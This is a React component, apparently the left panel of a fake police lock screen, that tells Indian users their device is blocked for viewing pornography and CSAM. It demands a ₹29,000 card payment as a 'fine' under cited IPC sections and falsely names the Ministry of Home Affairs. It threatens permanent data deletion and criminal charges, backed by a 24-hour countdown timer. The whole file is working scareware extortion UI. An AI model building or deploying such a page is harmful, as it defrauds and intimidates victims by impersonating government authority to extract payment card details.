
import React, { useState, useEffect } from 'react';
import { AlertTriangle, Shield, Clock, Lock } from 'lucide-react';

const LeftContent = () => {
  const [timeRemaining, setTimeRemaining] = useState({ hours: 23, minutes: 59, seconds: 59 });

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeRemaining(prev => {
        let { hours, minutes, seconds } = prev;
        
        if (seconds > 0) {
          seconds--;
        } else if (minutes > 0) {
          minutes--;
          seconds = 59;
        } else if (hours > 0) {
          hours--;
          minutes = 59;
          seconds = 59;
        } else {
          // Timer reached 00:00:00, reset or handle as needed
          clearInterval(timer);
          return { hours: 0, minutes: 0, seconds: 0 };
        }
        
        return { hours, minutes, seconds };
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatTime = (time: number) => time.toString().padStart(2, '0');

  return (
    <div className="flex-1 bg-gray-50 p-6 overflow-y-auto">
      {/* Device Block Message */}
      <div className="bg-red-600 text-white p-6 rounded-lg mb-6 text-center shadow-lg">
        <h1 className="text-2xl font-bold mb-4">
          YOUR DEVICE HAS BEEN BLOCKED
        </h1>
        <div className="space-y-3 text-left">
          <p className="font-semibold">
            Your device has been blocked due to repeated visits to pornographic sites containing materials prohibited by the laws of India.
          </p>
          <p className="text-yellow-200 font-bold">
            You must pay a fine of ₹29,000 by credit card as prescribed by IPC section 292 and 293.
          </p>
          <p className="text-yellow-100">
            <strong>Attention!</strong> If you fail to pay the fine or attempt to unblock your device without paying, all information will be permanently deleted.
          </p>
          <p>
            Criminal charges will be filed against you. Your device will be unlocked automatically after payment.
          </p>
        </div>
      </div>

      {/* New CSAM Section */}
      <div className="bg-white border border-gray-200 rounded-lg p-6 mb-6 shadow-sm">
        <h2 className="text-xl font-bold text-red-700 mb-4 border-b border-gray-200 pb-2">
          Child pornography / Child sexual abuse material (CSAM)
        </h2>
        <div className="space-y-4 text-gray-800 leading-relaxed">
          <p>
            Child sexually abusive material (CSAM) refers to a material containing sexual image(s) in any form, of a child who is abused or sexually exploited. It is punishable to publish or transmit material depicting children in sexually explicit act or conduct in any electronic form. It is covered under Section 67B of IT Act 2000.
          </p>
          <p>
            Child pornography is a form of child sexual exploitation. The production, distribution, importation, reception, or possession of any image of child pornography is prohibited. Violation of child pornography/CSAM laws is a serious crime.
          </p>
        </div>
      </div>

      {/* Legal Framework Section */}
      <div className="bg-white rounded-lg p-6 shadow-sm mb-6">
        <h3 className="font-semibold text-gray-900 mb-4 flex items-center">
          <Shield className="w-5 h-5 mr-2 text-blue-600" />
          Legal Framework & Compliance
        </h3>
        <div className="space-y-4">
          <div className="bg-red-50 border-l-4 border-red-400 p-4 rounded">
            <p className="font-medium text-red-800">
              <strong>Section 292 (1):</strong> Distribution of obscene content is punishable by imprisonment up to 2 years and fine up to ₹2,50,000.
            </p>
          </div>
          <div className="bg-red-50 border-l-4 border-red-400 p-4 rounded">
            <p className="font-medium text-red-800">
              <strong>Section 292 (2):</strong> Possession of such content for viewing is equally punishable under the law.
            </p>
          </div>
          <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 rounded">
            <p className="font-medium text-yellow-800">
              <strong>Warning:</strong> Case materials will be transferred to Ministry of Law for criminal proceedings if fine is not paid.
            </p>
          </div>
        </div>
      </div>

      {/* Status Information */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
        <div className="bg-white p-4 rounded-lg shadow-sm border">
          <div className="flex items-center mb-2">
            <Clock className="w-5 h-5 text-orange-600 mr-2" />
            <span className="font-semibold text-gray-900">Time Remaining</span>
          </div>
          <p className="text-2xl font-bold text-red-600">
            {formatTime(timeRemaining.hours)}:{formatTime(timeRemaining.minutes)}:{formatTime(timeRemaining.seconds)}
          </p>
          <p className="text-sm text-gray-600">Before permanent deletion</p>
        </div>
        
        <div className="bg-white p-4 rounded-lg shadow-sm border">
          <div className="flex items-center mb-2">
            <Lock className="w-5 h-5 text-red-600 mr-2" />
            <span className="font-semibold text-gray-900">Device Status</span>
          </div>
          <p className="text-2xl font-bold text-red-600">BLOCKED</p>
          <p className="text-sm text-gray-600">Payment required to unlock</p>
        </div>
      </div>

      {/* Fine Details */}
      <div className="bg-gradient-to-r from-red-100 to-red-50 border border-red-200 rounded-lg p-6">
        <h3 className="font-bold text-red-800 text-lg mb-3">
          Mandatory Fine Payment Details
        </h3>
        <div className="space-y-2 text-red-700">
          <p><strong>Fine Amount:</strong> ₹29,000 (Non-negotiable)</p>
          <p><strong>Payment Method:</strong> Credit/Debit Card Only</p>
          <p><strong>Processing Time:</strong> Immediate unlock after payment</p>
          <p><strong>Legal Authority:</strong> Ministry of Home Affairs</p>
        </div>
      </div>
    </div>
  );
};

export default LeftContent;
